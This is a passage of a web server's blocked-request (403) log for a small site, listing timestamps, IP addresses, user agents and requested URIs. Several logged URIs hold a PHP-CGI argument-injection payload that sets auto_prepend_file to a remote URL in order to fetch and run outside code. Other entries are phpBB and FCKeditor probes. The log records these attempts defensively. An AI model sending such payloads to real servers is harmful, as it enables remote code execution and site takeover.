+REQUEST_URI: /mail.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:43 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /webmail/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:43 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /mail/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:45 дп <<<<<<<<<<<
+REMOTE_ADDR: 150.70.173.46
+Host Name: 150-70-173-46.trendmicro.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:48 дп <<<<<<<<<<<
+REMOTE_ADDR: 150.70.172.104
+Host Name: 150-70-172-104.trendmicro.com
+SERVER_PROTOCOL: HTTP/1.0
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 127.0.0.1
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 21, 2013 - 3:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 46.160.39.192
+Host Name: ip192.net39.n37.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 21, 2013 - 3:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 46.160.39.192
+Host Name: ip192.net39.n37.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 22, 2013 - 1:05 дп <<<<<<<<<<<
+REMOTE_ADDR: 46.160.39.192
+Host Name: ip192.net39.n37.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 22, 2013 - 1:05 дп <<<<<<<<<<<
+REMOTE_ADDR: 46.160.39.192
+Host Name: ip192.net39.n37.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 22, 2013 - 6:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.216.124.201
+Host Name: ip124-201.telenet.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 22, 2013 - 6:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.216.124.201
+Host Name: ip124-201.telenet.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 23, 2013 - 9:09 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.164.111.198
+Host Name: 69.164.111.198
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 192.168.6.165
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/
+REQUEST_URI: /.google-analytics.com/ga.js
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 24, 2013 - 4:05 дп <<<<<<<<<<<
+REMOTE_ADDR: 37.59.62.43
+Host Name: ks3100133.kimsufi.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Dillo/0.8.6-i18n-misc
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 25, 2013 - 9:30 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 27, 2013 - 4:33 дп <<<<<<<<<<<
+REMOTE_ADDR: 46.188.40.148
+Host Name: broadband-46-188-40-148.2com.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 27, 2013 - 4:33 дп <<<<<<<<<<<
+REMOTE_ADDR: 46.188.40.148
+Host Name: broadband-46-188-40-148.2com.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 27, 2013 - 11:01 пп <<<<<<<<<<<
+REMOTE_ADDR: 112.123.168.54
+Host Name: YUDI-16878
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /Fckeditor/_whatsnew.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 28, 2013 - 5:31 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 1, 2014 - 5:21 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 4, 2014 - 3:36 дп <<<<<<<<<<<
+REMOTE_ADDR: 183.60.244.48
+Host Name: 183.60.244.48
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.1
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 4, 2014 - 3:36 дп <<<<<<<<<<<
+REMOTE_ADDR: 183.60.243.189
+Host Name: 183.60.243.189
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 4, 2014 - 4:54 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 7, 2014 - 10:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.57.231.109
+Host Name: 109.231.57.37.triolan.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/phpBB2/index.php
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 8, 2014 - 3:15 дп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.248.126
+Host Name: 162.243.248.126
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 8, 2014 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.242.89
+Host Name: 162.243.242.89
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 8, 2014 - 4:17 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 8:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.247.185
+Host Name: 162.243.247.185
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 8:58 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.247.185
+Host Name: 162.243.247.185
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 12, 2014 - 9:49 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 14, 2014 - 3:17 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.133.139.70
+Host Name: 70-139-133-95.pool.ukrtel.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 14, 2014 - 3:17 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.133.139.70
+Host Name: 70-139-133-95.pool.ukrtel.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 16, 2014 - 12:15 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 17, 2014 - 4:37 дп <<<<<<<<<<<
+REMOTE_ADDR: 91.188.117.221
+Host Name: WIN-7M3KHLIZKBD
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 17, 2014 - 4:37 дп <<<<<<<<<<<
+REMOTE_ADDR: 91.188.117.221
+Host Name: WIN-7M3KHLIZKBD
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 20, 2014 - 10:31 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 21, 2014 - 8:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 84.200.83.137
